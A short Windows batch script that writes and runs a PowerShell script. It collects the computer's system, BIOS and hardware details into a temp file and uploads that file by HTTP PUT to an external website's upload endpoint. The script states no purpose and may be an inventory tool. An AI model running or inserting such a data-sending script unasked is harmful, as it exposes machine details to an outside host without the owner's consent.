cd %temp%
echo Add-Type -AssemblyName System.Net.Http > info-upload.ps1
echo $Directory = $env:TEMP + '\' >> info-upload.ps1
echo $File = $env:COMPUTERNAME + '.txt' >> info-upload.ps1
echo $filePath = $Directory + $File >> info-upload.ps1
echo $ComputerInfo = Get-ComputerInfo >> info-upload.ps1
echo $Environment = Out-String -InputObject $ComputerInfo >> info-upload.ps1
echo $BIOSInfo = Get-CimInstance -ClassName Win32_BIOS >> info-upload.ps1
echo $BIOSString = Out-String -InputObject $BIOSInfo >> info-upload.ps1
echo $ComputerSystem = Get-CimInstance -ClassName Win32_ComputerSystem >> info-upload.ps1
echo $BIOSString += Out-String -InputObject $ComputerSystem >> info-upload.ps1
echo Add-Content -Path $filePath -Value (Get-Date) -PassThru >> info-upload.ps1
echo Add-Content -Path $filePath -Value $BIOSString -PassThru >> info-upload.ps1
echo Add-Content -Path $filePath -Value $Environment -PassThru >> info-upload.ps1
echo $uri = 'https://www.timwelch.co.nz/wbt/putfile.php' >> info-upload.ps1
echo $Response = Invoke-WebRequest -uri $uri -Method Put -Infile $filePath -ContentType 'text/plain' -UseBasicParsing -Verbose >> info-upload.ps1
PowerShell.exe -File ".\info-upload.ps1"